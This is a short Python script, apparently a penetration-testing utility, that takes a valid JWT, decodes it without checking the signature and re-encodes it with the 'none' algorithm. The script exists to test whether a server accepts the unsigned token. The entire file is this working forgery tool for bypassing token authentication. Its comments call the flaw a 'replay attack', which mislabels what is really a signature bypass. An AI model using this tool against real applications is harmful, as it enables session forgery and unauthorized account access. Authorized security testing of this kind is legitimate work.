#!/usr/bin/env python
# jwt-mimicker.py
# Generate an unsigned jwt based on a valid token.
# If it's accepted, then the application should be vulnerable to replay-attacks.

import jwt
import sys


def main():
    if len(sys.argv) <= 1:
        sys.stdout.write("\t-::: jwt-mimicker.py :::-\n")
        sys.stdout.write("# Generate an unsigned jwt based on a valid token.\n")
        sys.stdout.write(
            "# If it's accepted, then the application should be vulnerable to replay-attacks.\n")
        sys.stdout.write("\nUsage: %s [jwt-token]\n" % (sys.argv[0]))
        sys.stdout.flush()
        exit(0)

    jwt_token = sys.argv[1]
    jwt_token_value = jwt.decode(jwt_token, verify=False)

    new_jwt_token = jwt.encode(jwt_token_value, key=None, algorithm="none")
    new_jwt_token = new_jwt_token.decode("utf-8")

    sys.stdout.write("\n\n[#] Generated unsigned JWT:\n%s\n" %
                     (new_jwt_token))
    sys.stdout.flush()
    exit(0)


if __name__ == "__main__":
    main()
